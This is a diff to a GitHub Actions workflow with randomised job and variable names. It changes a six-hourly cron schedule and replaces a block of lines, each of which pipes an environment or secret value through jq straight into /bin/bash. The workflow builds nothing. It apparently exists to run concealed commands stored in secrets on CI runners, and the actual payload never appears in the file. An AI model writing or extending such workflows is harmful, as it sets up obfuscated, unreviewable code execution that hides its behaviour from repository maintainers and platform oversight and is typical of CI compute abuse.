@@ -2,7 +2,7 @@ name: xiangbanbai6745
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
+    - cron: '45 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +10,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiangbanbai6745
         env:
-          c6266: ${{ secrets.c6266 }}
+          pqn85: ${{ secrets.pqn85 }}
         run: |
-          echo $c6266 | jq -r .uju902 | /bin/bash
-          echo $my23399 | jq -r .ch5450 | /bin/bash
-          echo $ame4 | jq -r .hk61 | /bin/bash
-          echo $jaz0 | jq -r .mk478 | /bin/bash
-          echo $uvr9 | jq -r .pgpe794 | /bin/bash
-          echo $x40896 | jq -r .ybnku22 | /bin/bash
-          echo $g2982 | jq -r .zhox71629 | /bin/bash
-          echo $rxk2 | jq -r .g0 | /bin/bash
-          echo $c0346 | jq -r .l85349 | /bin/bash
-          echo $blgny26565 | jq -r .nizqv8 | /bin/bash
-          echo $rtc57 | jq -r .qetj00 | /bin/bash
-          echo $vy6 | jq -r .k5252 | /bin/bash
-          echo $hanq376 | jq -r .uxi4 | /bin/bash
-          echo $ssfyw36921 | jq -r .ygy36011 | /bin/bash
-          echo $o0 | jq -r .tdr874 | /bin/bash
+          echo $pqn85 | jq -r .u117 | /bin/bash
+          echo $hq0122 | jq -r .mlwg9138 | /bin/bash
+          echo $ls749 | jq -r .nwwbs3706 | /bin/bash
+          echo $cuz48925 | jq -r .ky4504 | /bin/bash
+          echo $tlgm34 | jq -r .rmad38444 | /bin/bash
+          echo $dc496 | jq -r .nau21 | /bin/bash
+          echo $fjssu4 | jq -r .lt94449 | /bin/bash
+          echo $diik77125 | jq -r .mlyq635 | /bin/bash
+          echo $yxctw0 | jq -r .hp759 | /bin/bash
+          echo $ekzav72111 | jq -r .erwmi38439 | /bin/bash
+          echo $fbv360 | jq -r .n2322 | /bin/bash
+          echo $tani226 | jq -r .fr30 | /bin/bash
+          echo $zhpn32119 | jq -r .id476 | /bin/bash
 
